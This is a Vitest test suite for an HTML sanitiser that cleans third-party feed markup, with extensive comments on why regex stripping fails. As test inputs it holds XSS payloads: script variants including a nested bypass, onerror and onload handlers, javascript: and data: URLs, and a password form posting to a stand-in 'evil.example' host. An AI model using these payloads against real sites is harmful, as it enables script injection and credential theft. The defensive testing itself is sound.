import { describe, expect, it } from "vitest";

import { absoluteHttpUrl, sanitizeHtml, textOf } from "./sanitize";

/*
 * What this suite is for: the only silent failure in this project (§6.5, N9).
 *
 * Every other defect here announces itself. A missed `<script>` renders
 * perfectly, looks like nothing went wrong, and executes in the session that
 * holds the Clerk cookie and can reach every mutation in the app. There is no
 * screen on which this looks broken, so a test is the only thing that can say
 * it is.
 *
 * ASSERTED ON THE PARSED RESULT, not on the string. `expect(out).not.toContain(
 * "<script")` passes for `<SCRIPT>`, for `<scr\0ipt>`, and for a payload that
 * survives as an attribute rather than an element — so each case below parses
 * the output and asks the DOM what is in it. A substring check on markup is the
 * same mistake as a regex over code, which this project has now made four
 * times.
 */

const BASE = "https://harbourwire.example/2026/11/12/tidal-barrier-vote";

/** Parses sanitiser output the way a browser would, and asks what survived. */
function parsed(html: string) {
  // `DOMParser` via jsdom's global: `vitest.config.mts` runs this environment,
  // so `document` is the same implementation the sanitiser cleans in.
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, "text/html");
  return {
    tags: [...doc.body.querySelectorAll("*")].map((el) => el.tagName.toLowerCase()),
    attrs: [...doc.body.querySelectorAll("*")].flatMap((el) =>
      [...el.attributes].map((a) => a.name.toLowerCase()),
    ),
    doc,
  };
}

const clean = (html: string) => sanitizeHtml(html, { baseUrl: BASE });

describe("sanitising third-party markup", () => {
  it("leaves ZERO script elements, however they are spelled", () => {
    /*
     * N9's assertion, and the variants matter more than the count.
     *
     * THE FIRST VERSION OF THIS TEST PASSED AGAINST A REGEX STRIP — three
     * well-formed `<script>…</script>` elements are exactly what
     * `/<script[^>]*>[\s\S]*?<\/script>/gi` handles, so the case that proves
     * the sanitiser was proving nothing. The last two defeat it, and they are
     * the shapes a real payload uses:
     *
     *   UNCLOSED, and LAST FOR TWO REASONS. The regex is lazy and needs a
     *   closing tag, so with none it matches nothing and the element passes
     *   through whole — a browser closes it at end-of-input and runs it. Put
     *   earlier, its match runs forward to the next `</script>` and swallows
     *   the case below (two versions of this test proved nothing that way),
     *   and the HTML PARSER does the same thing for real: everything after an
     *   unclosed `<script>` is script text until end of input, so a `<p>` put
     *   after it is correctly eaten by both.
     *
     *   NESTED, AND SPLIT ACROSS THE MATCH. `<scr<script></script>ipt>…`
     *   contains a well-formed empty element; removing it rejoins `<scr` and
     *   `ipt>` into a brand-new `<script>` that the single left-to-right pass
     *   has already moved past. The stripper HANDS BACK the thing it was asked
     *   to remove. Two earlier versions of this case were both swallowed whole
     *   by the lazy match and proved nothing.
     */
    const hostile = `
      <p>Before</p>
      <script>fetch('/api/subscriptions',{method:'POST'})</script>
      <SCRIPT>alert(1)</SCRIPT>
      <script type="text/javascript">alert(2)</script>
      <scr<script></script>ipt>alert(4)</script>
      <p>After</p>
      <script>alert(3)`;

    const out = clean(hostile);
    const { tags } = parsed(out);

    expect(tags.filter((t) => t === "script")).toHaveLength(0);
    // And the surrounding article survived, so the sanitiser is not just
    // returning empty — which would pass the assertion above and lose the body.
    expect(tags.filter((t) => t === "p")).toHaveLength(2);
    // The script's TEXT must not be left behind as a paragraph either: it would
    // render the attack as visible prose, which is merely wrong rather than
    // dangerous, but it is not what the feed said.
    expect(out).not.toContain("alert(1)");
    expect(out).not.toContain("fetch(");
    /*
     * `alert(4)`'s text DOES leak here, as the prose "ipt>alert(4)", and that
     * is accepted rather than overlooked. Its wrapper `<scr>` is a tag no
     * allowlist contains, and DOMPurify keeps the TEXT of an element it
     * removes — which has to stay on, because feed bodies are wrapped in
     * `<div>`s and turning it off would delete the article along with the
     * wrapper. Visible nonsense from a deliberately malformed payload is a
     * cosmetic cost; it executes nothing, which is what this test is for.
     */
  });

  it("drops every event handler, including on an element it keeps", () => {
    // `<img>` is ALLOWED, so this is not "the element was removed" — the
    // element stays and the handler does not. That distinction is the test.
    const out = clean(
      `<img src="https://harbourwire.example/a.jpg" onerror="alert(1)" onload="alert(2)" alt="A barrier">`,
    );
    const { tags, attrs, doc } = parsed(out);

    expect(tags).toContain("img");
    expect(attrs.filter((a) => a.startsWith("on"))).toEqual([]);
    expect(doc.body.querySelector("img")!.getAttribute("alt")).toBe("A barrier");
  });

  it("drops an `svg onload` payload by dropping the element", () => {
    // `<svg>` is not on the allowlist, which is the point: the handler cannot
    // survive on an element that does not.
    const { tags, attrs } = parsed(clean(`<svg onload="alert(1)"><circle r="9"/></svg>`));

    expect(tags).not.toContain("svg");
    expect(attrs.filter((a) => a.startsWith("on"))).toEqual([]);
  });

  it("removes an iframe, an object and a form", () => {
    /*
     * A form is the one people forget. It executes nothing, so it does not look
     * like an XSS — it renders a convincing login box inside the reader's own
     * chrome and POSTs wherever it likes.
     */
    const out = clean(`
      <iframe src="https://evil.example/"></iframe>
      <object data="https://evil.example/x.swf"></object>
      <embed src="https://evil.example/x">
      <form action="https://evil.example/collect" method="post">
        <input name="password" type="password">
      </form>`);
    const { tags } = parsed(out);

    for (const forbidden of ["iframe", "object", "embed", "form", "input"]) {
      expect(tags, forbidden).not.toContain(forbidden);
    }
  });

  it("strips a `javascript:` href but keeps the link's text", () => {
    /*
     * The anchor SURVIVES without its href, rather than being removed. The
     * words were part of a sentence, and deleting them changes what the article
     * says — which is the sanitiser deciding to edit rather than to protect.
     */
    const out = clean(`<p>See <a href="javascript:alert(1)">the report</a> for detail.</p>`);
    const { doc } = parsed(out);

    const anchor = doc.body.querySelector("a");
    expect(anchor, "the anchor was removed along with its text").not.toBeNull();
    expect(anchor!.hasAttribute("href")).toBe(false);
    expect(doc.body.textContent).toContain("the report");
  });

  it("strips `data:` and `vbscript:` the same way, without naming them", () => {
    // Not matched and rejected — they simply are not addresses
    // `absoluteHttpUrl` will produce. A scheme denylist has the same shape of
    // hole as a tag denylist.
    expect(absoluteHttpUrl("data:text/html,<script>alert(1)</script>", BASE)).toBeNull();
    expect(absoluteHttpUrl("vbscript:msgbox(1)", BASE)).toBeNull();
    expect(absoluteHttpUrl("JavaScript:alert(1)", BASE)).toBeNull();
    // And a real address still resolves, so the guard is not simply refusing.
    expect(absoluteHttpUrl("/feed.xml", BASE)).toBe("https://harbourwire.example/feed.xml");
  });

  it("resolves a relative href against where the markup was SERVED", () => {
    // A feed body is full of relative links, and a reader clicking one must not
    // be sent to a path on Cadence's own host.
    const out = clean(`<p><a href="../correction">A correction</a></p>`);
    const { doc } = parsed(out);

    expect(doc.body.querySelector("a")!.getAttribute("href")).toBe(
      "https://harbourwire.example/2026/11/correction",
    );
  });

  it("severs the opener on every outbound link", () => {
    /*
     * Without `noopener` the page a reader opens can reach back through
     * `window.opener` and navigate the tab they came from — a phishing step
     * that needs no script in OUR document, so the sanitiser above cannot see
     * it.
     */
    const out = clean(`<a href="https://elsewhere.example/">Elsewhere</a>`);
    const rel = parsed(out).doc.body.querySelector("a")!.getAttribute("rel") ?? "";

    expect(rel).toContain("noopener");
    expect(rel).toContain("noreferrer");
  });

  it("rewrites an image through the proxy, and drops one the proxy refuses", () => {
    /*
     * The rewrite is injected, so this also pins that the sanitiser hands over
     * an ABSOLUTE address — a proxy signing a relative one would sign something
     * it cannot fetch.
     */
    const seen: string[] = [];
    const out = sanitizeHtml(
      `<p><img src="/photo.jpg"></p><p><img src="https://blocked.example/x.jpg"></p>`,
      {
        baseUrl: BASE,
        rewriteImage: (absolute) => {
          seen.push(absolute);
          return absolute.includes("blocked.example") ? null : `/api/img?u=${absolute}`;
        },
      },
    );

    expect(seen).toEqual([
      "https://harbourwire.example/photo.jpg",
      "https://blocked.example/x.jpg",
    ]);
    const images = [...parsed(out).doc.body.querySelectorAll("img")];
    expect(images).toHaveLength(1);
    expect(images[0]!.getAttribute("src")).toContain("/api/img?u=");
  });

  it("does not leak the TEXT of an element whose contents are forbidden", () => {
    /*
     * `<title>` is not on the allowlist, and DOMPurify's default
     * `FORBID_CONTENTS` drops its text with it — along with `noscript`,
     * `template`, `xmp`, `iframe` and the MathML/SVG families, all of which
     * hide markup from a sanitiser that only inspects what renders.
     *
     * THIS FAILED when `FORBID_CONTENTS: ["script", "style"]` was set as
     * defence in depth. The option REPLACES that default list rather than
     * adding to it, and both names given were already in it — so the only
     * effect was deleting the other 24, and "Secret" below came through as
     * prose. A line written to tighten the sanitiser was the only thing
     * loosening it.
     */
    const out = clean(`<p>Before</p><title>Secret</title><p>After</p>`);

    expect(out).not.toContain("Secret");
    expect(parsed(out).tags.filter((t) => t === "p")).toHaveLength(2);
  });

  it("treats an EMPTY src or href as no address at all", () => {
    /*
     * `new URL("", base)` does not fail — it SUCCEEDS and returns the base. So
     * an `<img src="">` was rewritten to the article's own page and handed to
     * the proxy to sign and fetch as an image, and `<a href="">` became a
     * new-tab link back to the page the reader was already on. Both are
     * ordinary in real feed HTML, where a templating slip leaves the attribute
     * present and blank.
     */
    expect(absoluteHttpUrl("", BASE)).toBeNull();
    expect(absoluteHttpUrl("   ", BASE)).toBeNull();

    const asked: string[] = [];
    const out = sanitizeHtml(`<p><img src=""> <a href="">A link</a></p>`, {
      baseUrl: BASE,
      rewriteImage: (absolute) => {
        asked.push(absolute);
        return absolute;
      },
    });
    const { doc } = parsed(out);

    expect(asked, "the proxy was asked to sign the article page as an image").toEqual([]);
    expect(doc.body.querySelectorAll("img")).toHaveLength(0);
    expect(doc.body.querySelector("a")!.hasAttribute("href")).toBe(false);
    // The words stay, as with a `javascript:` href: the sanitiser protects,
    // it does not edit.
    expect(doc.body.textContent).toContain("A link");
  });

  it("returns an empty string rather than throwing on junk", () => {
    // This runs on whatever a publisher sent, including nothing.
    for (const junk of ["", "   ", null, undefined, 42, {}]) {
      expect(sanitizeHtml(junk as unknown as string, { baseUrl: BASE }), String(junk)).toBe("");
    }
  });

  it("unwraps a whole document rather than nesting a page in the pane", () => {
    const out = clean(`<html><head><title>T</title></head><body><p>Body</p></body></html>`);
    const { tags } = parsed(out);

    expect(tags).not.toContain("html");
    expect(tags).not.toContain("body");
    expect(tags).not.toContain("title");
    expect(tags).toContain("p");
  });
});

describe("measuring what there is to read", () => {
  it("counts TEXT, not markup", () => {
    /*
     * §6.5's `thin` threshold is 600 characters of text. A page that wraps two
     * sentences in a kilobyte of nav and footer divs has plenty of HTML and
     * nothing to read — a byte count calls that a successful extraction.
     */
    const wrapper = `<div><div><div><p>Two sentences. That is all.</p></div></div></div>`;
    expect(wrapper.length).toBeGreaterThan(50);
    expect(textOf(wrapper).trim()).toBe("Two sentences. That is all.");
  });

  it("is empty for nothing, rather than throwing", () => {
    expect(textOf("")).toBe("");
    expect(textOf(null as unknown as string)).toBe("");
  });
});
